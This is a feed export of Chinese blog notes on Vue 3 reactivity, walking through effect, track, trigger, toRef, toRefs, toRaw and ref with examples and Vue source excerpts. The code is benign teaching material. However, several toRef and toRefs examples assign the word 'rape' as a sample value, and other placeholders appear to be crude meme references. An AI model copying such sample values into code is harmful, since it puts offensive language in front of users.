<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局变量activeEffect</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">activeEffect</span>: <span class="title class_">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 收集当前副作用函数，并且初始化的时候调用一下</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fn 匿名函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">effect</span> = (<span class="params">fn: <span class="built_in">Function</span></span>)=&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一个闭包</span></span><br><span class="line">  <span class="keyword">const</span> _effect = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    activeEffect = _effect</span><br><span class="line">    <span class="title function_">fn</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化的时候调用一下</span></span><br><span class="line">  <span class="title function_">_effect</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="track"><a href="#track" class="headerlink" title="track"></a>track</h1><p>如图所示，通过以WeakMap为主的数据结构收集依赖。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305112331599.png"></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需要把对象和对象的key拼装成这种数据结构</span></span><br><span class="line"><span class="keyword">const</span> targetMap = <span class="keyword">new</span> <span class="title class_">WeakMap</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 依赖的收集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target 响应式对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> track = &lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt; <span class="function">(<span class="params">target: T, key: <span class="built_in">string</span> | <span class="built_in">symbol</span></span>)=&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> depsMap = targetMap.<span class="title function_">get</span>(target)</span><br><span class="line">  <span class="comment">// 如果targetMap中没有这个对象key</span></span><br><span class="line">  <span class="keyword">if</span>(!depsMap) &#123;</span><br><span class="line">    depsMap = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">    targetMap.<span class="title function_">set</span>(target, depsMap)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> deps = depsMap.<span class="title function_">get</span>(key)</span><br><span class="line">  <span class="comment">// 同理，如果deps中没有这个对象值key</span></span><br><span class="line">  <span class="keyword">if</span>(!deps) &#123;</span><br><span class="line">    deps = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line">    depsMap.<span class="title function_">set</span>(key, deps)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  deps.<span class="title function_">add</span>(activeEffect)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="trigger"><a href="#trigger" class="headerlink" title="trigger"></a>trigger</h1><p>更新依赖（就是调用这个值的副作用函数）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 依赖的更新</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> trigger = &lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt; <span class="function">(<span class="params">target: T, key: <span class="built_in">string</span> | <span class="built_in">symbol</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> depsMap = targetMap.<span class="title function_">get</span>(target)</span><br><span class="line">  <span class="keyword">if</span>(!depsMap) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;111&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> deps = depsMap.<span class="title function_">get</span>(key)</span><br><span class="line">  <span class="keyword">if</span>(!deps) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;222&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  deps.<span class="title function_">forEach</span>(<span class="function">(<span class="params">effect: <span class="built_in">Function</span></span>)=&gt;</span> <span class="title function_">effect</span>())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><blockquote>
<p>要先把TypeScript代码编译成JavaScript代码。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; reactive &#125; <span class="keyword">from</span> <span class="string">&quot;./reactive.js&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; effect &#125; <span class="keyword">from</span> <span class="string">&quot;./effect.js&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 定义一个reactive对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> person = <span class="title function_">reactive</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>: <span class="number">24</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 对象嵌套的情况</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">foo</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">bar</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">baz</span>: <span class="number">1919810</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 接收匿名函数，模拟DOM和数据的绑定</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">effect</span>(<span class="function">()=&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#app&quot;</span>).<span class="property">innerText</span> = <span class="string">`<span class="subst">$&#123;person.name&#125;</span> - <span class="subst">$&#123;person.age&#125;</span> - <span class="subst">$&#123;person.foo.bar.baz&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 实现了当数据变化时，视图就变化的响应式效果</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      person.<span class="property">name</span> = <span class="string">&quot;yjsp&quot;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        person.<span class="property">age</span> = <span class="number">114514</span></span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          person.<span class="property">foo</span>.<span class="property">bar</span>.<span class="property">baz</span> = <span class="number">364364</span></span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>to全家桶</title>
    <url>/web/study/Vue/8.to%E5%85%A8%E5%AE%B6%E6%A1%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="toRef"><a href="#toRef" class="headerlink" title="toRef"></a>toRef</h1><p>基于响应式对象上的一个属性创建一个对应的ref，这样创建的ref与其源属性保持同步。</p>
<p>改变源属性的值将更新ref的值，反之亦然。</p>
<p>如果对象是非响应式的，则不产生效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; person &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;toRef: &#123;&#123; like &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; person2 &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;toRef: &#123;&#123; like2 &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; toRef, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const person = &#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24,</span><br><span class="line">  like: &quot;ramen&quot;</span><br><span class="line">&#125;</span><br><span class="line">// 非响应式对象经过toRef处理</span><br><span class="line">// 参数1为对象，2为对象中的一个key</span><br><span class="line">const like = toRef(person, &quot;like&quot;)</span><br><span class="line"></span><br><span class="line">const person2 = reactive(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24,</span><br><span class="line">  like: &quot;ramen&quot;</span><br><span class="line">&#125;)</span><br><span class="line">// 响应式对象经过toRef处理</span><br><span class="line">const like2 = toRef(person2, &quot;like&quot;)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // 如果对象不是响应式，则值改变不会造成视图的改变</span><br><span class="line">  // person.like = &quot;rape&quot;</span><br><span class="line">  // console.log(person)</span><br><span class="line"></span><br><span class="line">  // toRef作用于非响应式，然并卵，对象本身变化了，但视图不变化</span><br><span class="line">  like.value = &quot;rape&quot;</span><br><span class="line">  console.log(person, like)</span><br><span class="line"></span><br><span class="line">  // toRef作用于响应式，对象和视图都变化了</span><br><span class="line">  like2.value = &quot;rape&quot;</span><br><span class="line">  console.log(person2, like2)</span><br><span class="line"></span><br><span class="line">  // 应用场景：只需要响应式对象上的某属性，并且希望它的改变能导致对象和视图改变</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="toRefs"><a href="#toRefs" class="headerlink" title="toRefs"></a>toRefs</h1><p>根据一个响应式对象创建普通对象，对象的每个属性都是指向原对象属性的ref，主要是方便解构使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; person &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; name &#125;&#125; - &#123;&#123; age &#125;&#125; - &#123;&#123; like &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; toRef, reactive, toRefs &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const person = reactive(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24,</span><br><span class="line">  like: &quot;ramen&quot;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// toRefs可以把对象的每一个属性都变成ref，</span><br><span class="line">// const toRefs = &lt;T extends object&gt;(object: T)=&gt; &#123;</span><br><span class="line">//   const map: any = &#123;&#125;</span><br><span class="line">//   for(let key in object) &#123;</span><br><span class="line">//     map[key] = toRef(object, key)</span><br><span class="line">//   &#125;</span><br><span class="line">//   return map</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// reactive一旦被解构，响应式就不存在了（变成普通值）</span><br><span class="line">// let &#123;name, age, like&#125; = person</span><br><span class="line">// 如果想要从响应式对象上解构响应式值，需要toRefs</span><br><span class="line">const &#123;name, age, like&#125; = toRefs(person)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  console.log(name, age, like)</span><br><span class="line">  // name = &quot;yjsp&quot;</span><br><span class="line">  // age = 114</span><br><span class="line">  // like = &quot;rape&quot;</span><br><span class="line">  name.value = &quot;yjsp&quot;</span><br><span class="line">  age.value = 114</span><br><span class="line">  like.value = &quot;rape&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="toRaw"><a href="#toRaw" class="headerlink" title="toRaw"></a>toRaw</h1><p>返回响应式对象的原始对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;look&quot;&gt;查看&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, toRaw &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const person = reactive&lt;any&gt;(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24,</span><br><span class="line">  like: &quot;ramen&quot;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const look = ()=&gt; &#123;</span><br><span class="line">  // toRaw能把响应式对象变成普通对象</span><br><span class="line">  console.log(person, toRaw(person))</span><br><span class="line">  // 本质上就是这样（__v_raw是一个隐藏属性）</span><br><span class="line">  console.log(person, person[&quot;__v_raw&quot;])</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/reactivity/src/ref.ts</code>）中可以看到toRef和toRefs的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前面是各种对函数的重载</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> toRef&lt;T&gt;(</span><br><span class="line">  <span class="attr">value</span>: T</span><br><span class="line">): T <span class="keyword">extends</span> () =&gt; infer R</span><br><span class="line">  ? <span class="title class_">Readonly</span>&lt;<span class="title class_">Ref</span>&lt;R&gt;&gt;</span><br><span class="line">  : T <span class="keyword">extends</span> <span class="title class_">Ref</span></span><br><span class="line">  ? T</span><br><span class="line">  : <span class="title class_">Ref</span>&lt;<span class="title class_">UnwrapRef</span>&lt;T&gt;&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> toRef&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>, K <span class="keyword">extends</span> keyof T&gt;(</span><br><span class="line">  <span class="attr">object</span>: T,</span><br><span class="line">  <span class="attr">key</span>: K</span><br><span class="line">): <span class="title class_">ToRef</span>&lt;T[K]&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> toRef&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>, K <span class="keyword">extends</span> keyof T&gt;(</span><br><span class="line">  <span class="attr">object</span>: T,</span><br><span class="line">  <span class="attr">key</span>: K,</span><br><span class="line">  <span class="attr">defaultValue</span>: T[K]</span><br><span class="line">): <span class="title class_">ToRef</span>&lt;<span class="title class_">Exclude</span>&lt;T[K], <span class="literal">undefined</span>&gt;&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">toRef</span>(<span class="params"></span></span><br><span class="line"><span class="params">  source: Record&lt;<span class="built_in">string</span>, <span class="built_in">any</span>&gt; | MaybeRef,	<span class="comment">// 第一个参数：一个对象</span></span></span><br><span class="line"><span class="params">  key?: <span class="built_in">string</span>,			<span class="comment">// 第二个参数：对象的一个key值</span></span></span><br><span class="line"><span class="params">  defaultValue?: <span class="built_in">unknown</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Ref</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isRef</span>(source)) &#123;</span><br><span class="line">    <span class="keyword">return</span> source</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isFunction</span>(source)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GetterRefImpl</span>(source) <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isObject</span>(source) &amp;&amp; <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">propertyToRef</span>(source, key!, defaultValue)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ref</span>(source)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">propertyToRef</span>(<span class="params">source: <span class="built_in">object</span>, key: <span class="built_in">string</span>, defaultValue?: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> val = (source <span class="keyword">as</span> <span class="built_in">any</span>)[key]		<span class="comment">// 取出key值的value</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">isRef</span>(val)			<span class="comment">// 判断value是否为ref对象</span></span><br><span class="line">    ? val					<span class="comment">// 是就直接返回</span></span><br><span class="line">    : (<span class="keyword">new</span> <span class="title class_">ObjectRefImpl</span>(		<span class="comment">// 否则变成ref</span></span><br><span class="line">        source <span class="keyword">as</span> <span class="title class_">Record</span>&lt;<span class="built_in">string</span>, <span class="built_in">any</span>&gt;,</span><br><span class="line">        key,</span><br><span class="line">        defaultValue</span><br><span class="line">      ) <span class="keyword">as</span> <span class="built_in">any</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObjectRefImpl</span>&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>, K <span class="keyword">extends</span> keyof T&gt; &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> __v_isRef = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> <span class="keyword">readonly</span> _object: T,</span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> <span class="keyword">readonly</span> _key: K,</span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> <span class="keyword">readonly</span> _defaultValue?: T[K]</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这里没有做收集依赖或者触发依赖更新，所以它对非响应式对象不会改变视图</span></span><br><span class="line">  <span class="comment">// 对响应式对象能改变视图，是因为reactive里会用proxy，里面有做收集依赖和触发依赖更新的的操作</span></span><br><span class="line">  <span class="comment">// 如果这里做了，那么就会产生做两次收集或触发的bug（toRef的属性做一次，reactive对象本身再做一次）</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> val = <span class="variable language_">this</span>.<span class="property">_object</span>[<span class="variable language_">this</span>.<span class="property">_key</span>]</span><br><span class="line">    <span class="keyword">return</span> val === <span class="literal">undefined</span> ? (<span class="variable language_">this</span>.<span class="property">_defaultValue</span> <span class="keyword">as</span> T[K]) : val</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">newVal</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_object</span>[<span class="variable language_">this</span>.<span class="property">_key</span>] = newVal</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">dep</span>(): <span class="title class_">Dep</span> | <span class="literal">undefined</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getDepFromReactive</span>(<span class="title function_">toRaw</span>(<span class="variable language_">this</span>.<span class="property">_object</span>), <span class="variable language_">this</span>.<span class="property">_key</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// toRefs，就是给对象的每个属性都toRef</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> toRefs&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt;(<span class="attr">object</span>: T): <span class="title class_">ToRefs</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (__DEV__ &amp;&amp; !<span class="title function_">isProxy</span>(<span class="built_in">object</span>)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`toRefs() expects a reactive object but received a plain one.`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">ret</span>: <span class="built_in">any</span> = <span class="title function_">isArray</span>(<span class="built_in">object</span>) ? <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="built_in">object</span>.<span class="property">length</span>) : &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> <span class="built_in">object</span>) &#123;</span><br><span class="line">    ret[key] = <span class="title function_">propertyToRef</span>(<span class="built_in">object</span>, key)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/reactivity/src/reactive.ts</code>）中可以看到toRaw的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 它从对象里取了一个属性，这个属性就是__v_raw</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> toRaw&lt;T&gt;(<span class="attr">observed</span>: T): T &#123;</span><br><span class="line">  <span class="keyword">const</span> raw = observed &amp;&amp; (observed <span class="keyword">as</span> <span class="title class_">Target</span>)[<span class="title class_">ReactiveFlags</span>.<span class="property">RAW</span>]</span><br><span class="line">  <span class="keyword">return</span> raw ? <span class="title function_">toRaw</span>(raw) : observed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="keyword">enum</span> <span class="title class_">ReactiveFlags</span> &#123;</span><br><span class="line">  <span class="variable constant_">SKIP</span> = <span class="string">&#x27;__v_skip&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">IS_REACTIVE</span> = <span class="string">&#x27;__v_isReactive&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">IS_READONLY</span> = <span class="string">&#x27;__v_isReadonly&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">IS_SHALLOW</span> = <span class="string">&#x27;__v_isShallow&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">RAW</span> = <span class="string">&#x27;__v_raw&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Ref全家桶</title>
    <url>/web/study/Vue/6.Ref%E5%85%A8%E5%AE%B6%E6%A1%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h1><p>接收一个内部值并返回响应式且可变的ref对象，ref对象仅有一个<code>.value</code>属性，指向该内部值。</p>
<blockquote>
<p>浏览器控制台设置里，勾选“启动自定义格式化程序”并刷新，控制台就能看格式化后整齐的ref，reactive也是如此。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123;person&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">  &lt;div ref=&quot;dom&quot;&gt;我是个DOM&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import type &#123; Ref &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">type P = &#123;</span><br><span class="line">  name: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ref 作深层响应式</span><br><span class="line">// 也可以不写类型定义或泛型，ref会做类型推断</span><br><span class="line">// const person = ref&lt;P&gt;(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line">// const person: Ref&lt;P&gt; = ref(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line">const person = ref(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line">    </span><br><span class="line">// 不用ref包裹就没有响应式</span><br><span class="line">const person2 = &#123; name: &quot;pinky&quot; &#125;</span><br><span class="line"></span><br><span class="line">// ref还可以取得DOM元素，变量名需要和元素的ref属性值一致</span><br><span class="line">const dom = ref&lt;HTMLDivElement&gt;()</span><br><span class="line"></span><br><span class="line">// 在setup语法糖里只能读到undefined，因为在这个阶段，DOM还没有被渲染</span><br><span class="line">console.log(dom.value?.innerText)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // person.name = &quot;野兽先辈&quot;</span><br><span class="line">  // ref函数返回一个类，其中有一个属性value，修改或取值时必须带上value</span><br><span class="line">  person.value.name = &quot;野兽先辈&quot;</span><br><span class="line">  console.log(person)</span><br><span class="line">  console.log(dom.value?.innerText)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="isRef"><a href="#isRef" class="headerlink" title="isRef"></a>isRef</h1><p>判断是否为ref对象</p>
